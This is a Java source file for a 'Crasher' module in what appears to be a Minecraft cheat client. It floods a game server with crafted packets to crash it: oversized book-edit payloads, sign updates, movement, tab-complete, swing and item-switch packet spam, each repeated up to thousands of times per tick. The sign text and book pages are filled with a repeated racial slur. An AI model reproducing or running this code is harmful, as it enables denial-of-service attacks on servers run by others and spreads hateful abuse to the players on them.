package nl.x.client.cheat.cheats.player;

import java.util.Objects;

import com.google.common.collect.Lists;

import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemBook;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import nl.x.api.annotations.Info;
import nl.x.api.cheat.Cheat;
import nl.x.api.cheat.value.values.ArrayValue;
import nl.x.api.cheat.value.values.NumberValue;
import nl.x.api.event.Event;
import nl.x.api.event.impl.EventTick;
import nl.x.api.event.impl.EventUpdate;

/**
 * @author NullEX
 *
 */
@Info(name = "Crasher")
public class Crasher extends Cheat {
	public final IChatComponent[] signText = new IChatComponent[] {
			new ChatComponentText(
					"NIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERS"),
			new ChatComponentText(
					"NIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERS"),
			new ChatComponentText(
					"NIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERS"),
			new ChatComponentText(
					"NIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERSNIGGERS") };
	public ArrayValue mode = new ArrayValue("Mode",
			Lists.newArrayList("CustomPayload", "Sign", "Packet Spam", "Tab", "Swing", "Item-Switch"), "CustomPayload");
	public NumberValue amount = new NumberValue("Amount", 100, 1, 10000, 1);
	public PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());

	public Crasher() {
		this.addValue(this.mode, this.amount);
	}

	/*
	 * @see nl.x.api.cheat.Cheat#onEvent(nl.x.api.event.Event)
	 */
	@Override
	public void onEvent(Event e) {
		if (e instanceof EventUpdate) {
			this.setSuffix(this.mode.getValue().toString());
		}
		if (e instanceof EventTick) {
			if (Objects.nonNull(mc.thePlayer) && Objects.nonNull(mc.theWorld)) {
				switch (this.mode.getValue().toString().toLowerCase()) {
					case "custompayload":
						for (int i = 0; i < this.amount.getValue().intValue(); i++) {
							ItemStack stack = mc.thePlayer.getCurrentEquippedItem();
							if (Objects.isNull(stack))
								break;
							if (stack.getItem() instanceof ItemBook) {
								for (int i2 = 0; i2 < 100; i2++) {
									this.addPage(stack, "FUCK NIGGERS");
								}
							} else {
								for (int i2 = 0; i2 < 20; i2++) {
									buffer.writeItemStackToBuffer(stack);
								}
							}
							buffer.writeItemStackToBuffer(stack);
							this.mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BEdit", buffer));
						}
						break;
					case "sign":
						for (int i = 0; i < this.amount.getValue().intValue(); i++) {
							this.mc.getNetHandler()
									.addToSendQueue(new C12PacketUpdateSign(mc.thePlayer.getPosition(), this.signText));
						}
						break;
					case "packet spam":
						for (int i = 0; i < this.amount.getValue().intValue(); i++) {
							this.mc.getNetHandler().addToSendQueue(new C03PacketPlayer());
						}
						break;
					case "tab":
						for (int i = 0; i < Math.max(this.amount.getValue().intValue(), 150); i++) {
							this.mc.getNetHandler().addToSendQueue(new C14PacketTabComplete("/"));
						}
						break;
					case "swing":
						for (int index = 0; index < this.amount.getValue().intValue(); index++) {
							this.mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
						}
						break;
					case "item-switch":
						for (int index = 0; index < this.amount.getValue().intValue(); ++index) {
							this.mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
							this.mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
							this.mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
							this.mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
						}
						break;
				}
			}

		}
		super.onEvent(e);
	}

	private void addPage(ItemStack item, String text) {
		if (item.getItem() instanceof ItemBook) {
			if (item.stackTagCompound == null) {
				item.setTagCompound(new NBTTagCompound());
			}
			if (!item.stackTagCompound.hasKey("pages", 9)) {
				item.stackTagCompound.setTag("pages", new NBTTagList());
			}
			NBTTagList list = item.getTagCompound().getTagList("pages", 8);
			if (list == null) {
				list = new NBTTagList();
				list.appendTag(new NBTTagString(text));
			} else {
				list.appendTag(new NBTTagString(text));
				item.setTagInfo("pages", list);
			}
		}
	}

}
